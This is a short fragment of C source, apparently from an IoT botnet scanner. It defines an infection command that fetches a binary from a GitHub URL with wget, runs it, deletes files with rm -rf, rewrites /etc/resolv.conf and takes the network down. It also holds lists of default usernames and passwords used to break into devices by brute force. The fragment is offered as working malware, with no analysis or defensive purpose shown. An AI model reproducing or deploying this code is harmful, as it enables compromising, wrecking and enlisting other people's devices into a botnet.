...
char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/x0rLS/g0sh/blob/master/alg0d?raw=true -O alg0d; chmod +x alg0d; ./alg0d; rm -rf *; echo nameserver 1.1.1.1 >> /etc/resolv.conf; ifdown -a;exit\r\n";
...
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "monitor/0", "security/0", "tech/0"};
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "\0", "password\0", "support\0", "tech\0", "PASSWORD/0", "synnet/0", "monitor/0", "security/0", "switch/0", "14admin/0", "ascend/0", "telos/0"};
